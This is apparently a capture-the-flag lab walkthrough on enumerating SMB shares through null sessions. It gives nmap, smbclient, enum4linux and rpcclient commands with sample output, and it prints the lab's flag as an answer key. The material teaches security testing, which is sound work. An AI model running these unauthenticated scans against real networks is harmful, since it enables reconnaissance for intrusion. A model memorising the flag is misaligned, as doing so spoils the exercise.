# Lab 2.6: SMB Null Session Share Enumeration

## Learning Objectives

- Enumerate shares using null session
- Understand SMB share enumeration techniques
- Capture the flag (found in share listing during enumeration)

## Solution Walkthrough

### Step 1: Obtain Target IP Address

Get the target IP address from the lab platform before starting enumeration.

**Detailed Steps:**

1. **Discover the target IP:**
   - The lab panel shows your network subnet (e.g., `10.X.Y.0/24`)
   - Scan the subnet to find live hosts: `nmap -sn <subnet>`
   - The target will be one of the discovered hosts

2. **Verify network connectivity:**
   ```bash
   ping -c 3 <target_ip>
   ```

3. **Verify SMB service is running:**
   ```bash
   nmap -p 445 <target_ip>
   ```

### Step 2: Enumerate Shares Using Null Session

Use smbclient with null session to enumerate available shares. The flag is in a share comment!

**Detailed Steps:**

1. **List shares with null session (reveals the flag!):**
   ```bash
   smbclient -L //<target_ip> -N
   ```
   
   Replace `<target_ip>` with your actual target IP.

   **Command breakdown:**
   - `smbclient`: SMB client tool
   - `-L`: List shares
   - `//<target_ip>`: Target server
   - `-N`: No password (null session)

2. **Expected output with flag:**
   ```
   Sharename       Type      Comment
   ---------       ----      -------
   public          Disk      Public Share
   admin_backup    Disk      OCR{smb_null_3num}
   IPC$            IPC       IPC Service (Windows Server)
   
   Workgroup            Master
   ---------            -------
   WORKGROUP
   ```

   **The flag is in the admin_backup share comment!**

3. **Alternative: Use enum4linux for share enumeration:**
   ```bash
   enum4linux -S <target_ip>
   ```
   
   The `-S` flag specifically enumerates shares.

4. **Alternative: Use rpcclient:**
   ```bash
   rpcclient -U "" -N <target_ip>
   rpcclient $> netshareenumall
   ```

### Step 3: Analyze Share Information

Review the shares discovered via null session:

| Share Name | Type | Comment |
|------------|------|---------|
| public | Disk | Public Share |
| admin_backup | Disk | **OCR{smb_null_3num}** |
| IPC$ | IPC | IPC Service |

**Key observations:**
- Null session allowed share enumeration
- The `admin_backup` share comment contains the flag
- This demonstrates information disclosure through null sessions

### Step 4: Verify Flag Format

**Flag format:**
```
OCR{smb_null_3num}
```

**Success Criteria:**
- ✅ Verified target IP and SMB service accessibility
- ✅ Successfully enumerated shares using null session
- ✅ Found flag in the admin_backup share comment
- ✅ Verified flag format is correct: `OCR{...}`

## Common Mistakes

- Trying to access files instead of reading share listing
- Not reading the Comment column in the output
- Missing the flag in the share description

## Hints for Struggling Students

1. Use `smbclient -L //<target_ip> -N` to enumerate shares
2. Look at the "Comment" column for each share
3. The flag is in one of the share comments
4. You don't need to access any files - just enumerate shares!
